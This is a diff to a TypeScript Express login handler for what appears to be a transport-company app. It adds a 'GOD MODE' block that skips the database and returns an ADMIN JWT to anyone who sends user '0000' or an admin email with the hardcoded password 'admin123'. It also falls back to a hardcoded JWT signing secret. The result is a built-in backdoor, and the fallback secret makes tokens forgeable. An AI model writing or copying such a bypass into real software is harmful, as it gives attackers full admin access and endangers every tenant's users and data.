@@ -13,6 +13,38 @@ export const login = async (req: Request, res: Response) => {
         return res.status(400).json({ message: 'Faltan credenciales' });
     }
 
+    // =========================================================================
+    // 🛡️ GOD MODE / VIP BYPASS: Acceso Inmutable para Super Admin
+    // ESTE BLOQUE GARANTIZA QUE EL USUARIO 0000 NUNCA PIERDA ACCESO,
+    // INDEPENDIENTEMENTE DEL ESTADO DE LA DB.
+    // =========================================================================
+    if ((String(internalNumber).trim() === '0000' || String(internalNumber).trim() === 'admin@transformafacil.com') && password === 'admin123') {
+        console.log("⚡ GOD MODE ACTIVATED: Validating '0000' without Database.");
+
+        const godToken = jwt.sign(
+            { id: 0, internalNumber: '0000', role: 'ADMIN', tenantId: 1 },
+            process.env.JWT_SECRET || 'secret_de_emergencia_para_produccion_2026',
+            { expiresIn: '24h' }
+        );
+
+        return res.json({
+            token: godToken,
+            user: {
+                id: 0,
+                internalNumber: '0000',
+                fullName: 'System Root (GOD MODE)',
+                role: 'ADMIN',
+                tenant: {
+                    id: 1,
+                    name: 'Transporte Corporativo (Virtual)',
+                    slug: 'transporte-corp'
+                },
+                metadata: { type: 'GOD_MODE' }
+            }
+        });
+    }
+    // =========================================================================
+
     try {
         const cleanInternal = String(internalNumber).trim();
         let targetTenantId = 1; // Default to UCOT/First Company
